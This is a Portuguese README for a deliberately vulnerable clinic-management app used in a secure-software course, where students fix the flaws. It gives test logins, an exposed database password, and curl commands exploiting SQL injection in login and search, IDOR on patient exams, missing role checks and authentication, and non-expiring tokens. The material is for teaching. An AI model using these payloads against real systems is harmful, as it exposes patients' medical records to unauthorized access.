**VidaPlus (legado) — como rodar e explorar**  
Sistema de gestão de clínica **intencionalmente vulnerável**, base do projeto da  
   
 disciplina SSC. Objetivo: os grupos o **corrigem e adequam** ao longo do SSDLC.  
A interface (React + React Router) é uma UI real de sistema de saúde — login, painel por
papel, busca de pacientes, ficha e exames navegáveis por URL — para que a exploração das
falhas (ex.: trocar o id na barra de endereços) aconteça como um usuário real faria, não só
via `curl`. Os comandos abaixo continuam valendo para testar a API diretamente.  
  
**Subir o ambiente**  
docker compose up --build  
 # Frontend:  http://localhost:4200  
 # API:       http://localhost:8080  
 # MySQL:     localhost:3306 (vidaplus / vidaplus123)  ← credencial exposta de propósito  
   
**Usuários de teste**  
| | | |  
|-|-|-|  
| **E-mail** | **Senha** | **Papel** |   
| [admin@vidaplus.local](mailto:admin@vidaplus.local "mailto:admin@vidaplus.local") | Admin123 | ADMIN |   
| [dra.house@vidaplus.local](mailto:dra.house@vidaplus.local "mailto:dra.house@vidaplus.local") | Medico123 | MEDICO (atende Ana e Carla, **não** Bruno) |   
| [recepcao@vidaplus.local](mailto:recepcao@vidaplus.local "mailto:recepcao@vidaplus.local") | Recep123 | RECEPCAO |   
| [bio@vidaplus.local](mailto:bio@vidaplus.local "mailto:bio@vidaplus.local") | Bio123 | BIOQUIMICO |   
| [ana.paciente@email.com](mailto:ana.paciente@email.com "mailto:ana.paciente@email.com") | Paciente123 | PACIENTE (id 1, exames 101/103) |   
| [bruno.paciente@email.com](mailto:bruno.paciente@email.com "mailto:bruno.paciente@email.com") | Paciente123 | PACIENTE (id 2, exame 102) |   
   
**Falhas exploráveis **  
# V-01 SQL Injection no login (ignora a senha):  
 curl -s -X POST localhost:8080/api/auth/login \  
   -H 'Content-Type: application/json' \  
   -d '{"email":"admin@vidaplus.local'"'"' -- ","senha":"qualquer"}'  
   
 # Login normal do paciente Ana:  
 TOKEN=$(curl -s -X POST localhost:8080/api/auth/login \  
   -H 'Content-Type: application/json' \  
   -d '{"email":"ana.paciente@email.com","senha":"Paciente123"}' \  
   | sed -E 's/.*"access_token":"([^"]+)".*/\1/')  
   
 # V-03 IDOR: Ana (dona do 101) acessa o exame 102, que é do Bruno:  
 curl -s localhost:8080/api/exames/102 -H "Authorization: Bearer $TOKEN"   # retorna 200 (FALHA)  
   
 # V-04 RBAC: Ana (paciente) publica um laudo:  
 curl -s -X POST localhost:8080/api/exames/104/publicar -H "Authorization: Bearer $TOKEN"  
   
 # V-13 SQL Injection na busca:  
 curl -s "localhost:8080/api/pacientes/busca?q=%27%20OR%20%271%27%3D%271"  
   
 # V-08 enumeração/reset fraco:  
 curl -s -X POST localhost:8080/api/auth/reset -H 'Content-Type: application/json' \  
   -d '{"email":"naoexiste@x.com"}'   # resposta denuncia inexistência  
   
 # V-19 nota clinica sem NENHUMA autenticacao (nem token):  
 curl -s localhost:8080/api/pacientes/1/notas   # 200 mesmo sem header algum (FALHA)  
    
 # V-09 arquivo de laudo em pasta publica, SEM NENHUM auth (nem token):  
  curl -s localhost:4200/laudos/laudo-102.pdf   # 200 application/pdf (FALHA)  
  # o exame 104 (sorologia, NAO publicado) tambem baixa - 'publicado' e so rotulo:  
  curl -s localhost:4200/laudos/laudo-104.pdf   # 200 mesmo assim (FALHA)  
    
 # V-07 o "logout" é cosmético (o token nunca morre):  
 #  1. logue na UI e copie o token: DevTools > Console > localStorage.access_token  
 #  2. clique em "Sair" (a tela volta ao login e o localStorage é limpo)  
 #  3. reenvie o token antigo — segue valendo, pois não há expiração  
 #     nem invalidação no servidor:  
 curl -s localhost:8080/api/exames/101 -H "Authorization: Bearer $TOKEN_ANTIGO"   # 200 (FALHA)  
   
 **Funcionalidades por papel (F-03 RBAC — mesma falha, mais superfície)**  
 Cada papel ganhou uma tela própria (menu no topo), mas o backend **não checa papel em nenhuma delas** — todas reproduzem com o token de **qualquer** usuário autenticado, inclusive PACIENTE:  
   
 # ADMIN: gestao de usuarios (listar + ativar/desativar QUALQUER conta)  
 curl -s localhost:8080/api/usuarios -H "Authorization: Bearer $TOKEN"   # 200 mesmo p/ Ana (PACIENTE)  
   
 # RECEPCAO: agenda (listar + marcar atendimento medico x paciente)  
 curl -s localhost:8080/api/atendimentos -H "Authorization: Bearer $TOKEN"  
   
 # MEDICO: carteira de pacientes por id de medico livre (troque o 1 por outro)  
 curl -s localhost:8080/api/atendimentos/medico/1 -H "Authorization: Bearer $TOKEN"  
   
 # BIOQUIMICO: fila de TODOS os laudos pendentes (qualquer paciente, qualquer status)  
 curl -s localhost:8080/api/exames/pendentes -H "Authorization: Bearer $TOKEN"  
   
 # PACIENTE: solicitar exame - tambem em nome de OUTRO paciente (IDOR)  
 curl -s -X POST localhost:8080/api/exames/solicitar -H "Authorization: Bearer $TOKEN" \
   -H 'Content-Type: application/json' -d '{"pacienteId":2,"tipo":"exame em nome do Bruno"}'  
   
 *(Estas 5 telas são enriquecimento de UI/demonstração do F-03 — não são novos itens do catálogo F-01..F-21; a correção esperada é a mesma: checar `JwtUtil.papelDoToken(...)` deny-by-default em cada endpoint.)*  
   
**Estado esperado ao final do semestre**  
Cada uma dessas explorações deve **deixar de funcionar** e o gate correspondente no  
   
 pipeline deve ficar **verde**. O mapa falha → correção → gate fica no repositório  
